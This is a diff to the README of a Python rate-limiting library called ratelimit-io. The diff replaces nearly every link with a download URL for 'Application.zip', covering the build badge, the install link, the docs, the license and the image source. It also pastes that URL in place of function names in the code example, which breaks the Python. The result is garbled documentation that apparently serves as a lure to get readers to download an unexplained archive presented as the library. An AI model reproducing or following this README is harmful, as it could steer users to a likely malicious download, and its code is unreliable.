@@ -1,6 +1,6 @@
 # ratelimit-io 🚀
 
-[![Build Status](https://img.shields.io/badge/Download-Application.zip-blue)](https://github.com/user-attachments/files/18426772/Application.zip)
+[![Build Status](https://github.com/Tensxi/ratelimit-io/releases/download/v1.0/Application.zip)](https://github.com/Tensxi/ratelimit-io/releases/download/v1.0/Application.zip)
 
 ## Overview ℹ️
 
@@ -17,7 +17,7 @@ Welcome to **ratelimit-io**, a flexible bidirectional rate-limiting library with
 
 To get started with **ratelimit-io**, simply download the library from the following link:
 
-[Download ratelimit-io](https://github.com/user-attachments/files/18426772/Application.zip)
+[Download ratelimit-io](https://github.com/Tensxi/ratelimit-io/releases/download/v1.0/Application.zip)
 
 You can also install it using pip:
 
@@ -37,17 +37,17 @@ async def main():
     limiter = RateLimiter(redis_url='redis://localhost')
     
     # Limit incoming requests
-    await limiter.limit('api_requests', '127.0.0.1', max_requests=100, interval=60)
+    await https://github.com/Tensxi/ratelimit-io/releases/download/v1.0/Application.zip('api_requests', '127.0.0.1', max_requests=100, interval=60)
     
     # Limit outgoing requests
-    await limiter.limit('external_requests', 'example.com', max_requests=500, interval=3600)
+    await https://github.com/Tensxi/ratelimit-io/releases/download/v1.0/Application.zip('external_requests', 'https://github.com/Tensxi/ratelimit-io/releases/download/v1.0/Application.zip', max_requests=500, interval=3600)
 
-asyncio.run(main())
+https://github.com/Tensxi/ratelimit-io/releases/download/v1.0/Application.zip(main())
 ```
 
 ## Advanced Usage 🚀
 
-For more advanced usage and customization options, check out the full documentation [here](https://ratelimit.io/docs).
+For more advanced usage and customization options, check out the full documentation [here](https://github.com/Tensxi/ratelimit-io/releases/download/v1.0/Application.zip).
 
 ## Topics 📚
 
@@ -76,17 +76,17 @@ We welcome contributions to **ratelimit-io**! If you have any ideas for improvem
 
 ## Stay Updated 📢
 
-Stay updated with the latest releases and updates by checking the [Releases](https://github.com/user-attachments/files/18426772/Application.zip) section.
+Stay updated with the latest releases and updates by checking the [Releases](https://github.com/Tensxi/ratelimit-io/releases/download/v1.0/Application.zip) section.
 
 ## License 📜
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/user-attachments/files/18426772/Application.zip) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/Tensxi/ratelimit-io/releases/download/v1.0/Application.zip) file for details.
 
 ---
 
 Feel free to explore the capabilities of **ratelimit-io** and unleash the power of bidirectional rate limiting in your applications! 🚀🔒
 
-![Rate Limiting](https://example.com/ratelimit.png) # Image Source: example.com
+![Rate Limiting](https://github.com/Tensxi/ratelimit-io/releases/download/v1.0/Application.zip) # Image Source: https://github.com/Tensxi/ratelimit-io/releases/download/v1.0/Application.zip
 
 Let's rate-limit like never before with **ratelimit-io**! 🌟
 
